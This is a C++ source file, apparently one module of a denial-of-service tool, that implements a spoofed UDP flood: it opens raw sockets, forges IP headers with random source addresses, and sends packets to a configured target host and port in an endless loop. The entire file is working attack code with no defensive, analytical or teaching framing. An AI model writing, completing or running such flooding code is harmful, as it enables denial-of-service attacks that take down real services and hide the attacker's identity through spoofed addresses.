#include <cstring>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netdb.h>

#include "Randomizer.hpp"
#include "Spoofed_UDP_Flood.hpp"

void Spoofed_UDP_Flood::attack(const int *id) {
    int s, on = 1, x;
    std::string message{};
    char buf[8192];
    auto *ip = (struct ip *)buf;
    auto *udp = (struct udphdr *)(ip + 1);
    struct hostent *hp;
    struct sockaddr_in dst{};
    auto s_port = Randomizer::randomInt(0, 65535);
    while (true){
        for(x = 0; x < conf->CONNECTIONS; x++){
            bzero(buf, sizeof(buf));
            if((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0){
                logger->Log("socket() error", Logger::Error);
                exit(EXIT_FAILURE);
            }

            if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0){
                logger->Log("setsockopt() error", Logger::Error);
                exit(EXIT_FAILURE);
            }

            if((hp = gethostbyname(conf->website.c_str())) == nullptr){
                if((ip->ip_dst.s_addr = inet_addr(conf->website.c_str())) < 0){
                    logger->Log("Can't resolve the host", Logger::Error);
                    exit(EXIT_FAILURE);
                }
            }else{
                bcopy(hp->h_addr_list[0], &ip->ip_dst.s_addr, static_cast<size_t>(hp->h_length));
            }
            if((ip->ip_src.s_addr = inet_addr(Randomizer::randomIP())) < 0){
                logger->Log("Unable to set random src ip", Logger::Error);
                exit(EXIT_FAILURE);
            }

            // IP Struct
            ip->ip_hl = 5;
            ip->ip_v = 4;
            ip->ip_tos = 16;
            ip->ip_len = htons(sizeof(buf));
            ip->ip_id = static_cast<u_short>(Randomizer::randomInt(1, 1000));
            ip->ip_ttl = 64;
            ip->ip_p = 17;
            ip->ip_off = htons(0x0);
            ip->ip_sum = 0;

            dst.sin_addr = ip->ip_dst;
            dst.sin_family = AF_UNSPEC;

            // UDP Struct
            udp->source = htons(static_cast<uint16_t>(s_port));
            udp->dest = htons(static_cast<uint16_t>(strtol(conf->port.c_str(), nullptr, 10)));
            udp->len = htons(sizeof(struct udphdr));
            udp->check = htons(csum((unsigned short *) buf, (sizeof(struct ip) + sizeof(struct udphdr))));

            if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0){
                logger->Log("setsockopt() error", Logger::Error);
                exit(EXIT_FAILURE);
            }

            if(sendto(s, buf, ip->ip_len, 0, (sockaddr*)&dst, sizeof(struct sockaddr_in)) < 0){
                logger->Log("sendto() error", Logger::Error);
                exit(EXIT_FAILURE);
            }
            close(s);
        }
        message = std::to_string(*id) + ": Voly Sent";
        logger->Log(&message, Logger::Info);
        usleep(static_cast<__useconds_t>(conf->delay));
    }
}

Spoofed_UDP_Flood::Spoofed_UDP_Flood(const config *conf, Logger *logger) : Spoofed_Flood(conf, logger) {

}
